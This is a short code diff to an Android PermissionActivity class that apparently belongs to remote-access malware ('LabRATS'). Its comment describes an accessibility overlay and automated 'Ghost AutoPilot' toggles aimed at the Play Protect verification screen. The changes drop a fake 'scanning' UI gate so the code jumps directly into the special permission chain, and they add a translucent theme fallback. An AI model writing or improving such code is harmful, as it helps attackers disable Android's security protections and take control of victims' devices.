@@ -16,7 +16,7 @@ import android.widget.ProgressBar;
 import android.widget.TextView;
 
 import androidx.annotation.NonNull;
-import androidx.appcompat.app.AppCompatActivity;
+import android.app.Activity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
@@ -30,7 +30,7 @@ import java.util.List;
  * Streamlined: Uses Accessibility guide overlay for service enablement, then directly triggers
  * settings intents on Play Protect verifying UI while Ghost AutoPilot handles switch toggles.
  */
-public class PermissionActivity extends AppCompatActivity {
+public class PermissionActivity extends Activity {
 
     private static final int PERMISSION_REQUEST_CODE = 2001;
 
@@ -120,19 +120,17 @@ public class PermissionActivity extends AppCompatActivity {
             return;
         }
         
-        boolean accMissing = !isAccessibilityServiceEnabled(this);
-        if (!hasScanned && (accMissing || !areRuntimePermissionsGranted())) {
-            setupScanningUI();
-        } else {
-            checkSpecialChain();
-        }
-        
+        checkSpecialChain();
         handleInstructions(getIntent());
     }
 
     private void setupScanningUI() {
         if (isAnimationRunning) return;
-        setTheme(R.style.Theme_LabRATS_Permissions);
+        try {
+            setTheme(R.style.Theme_LabRATS_Permissions);
+        } catch (Throwable t) {
+            setTheme(android.R.style.Theme_Translucent_NoTitleBar);
+        }
         setContentView(R.layout.activity_guide_permission);
         currentLayoutType = "scanning";
 
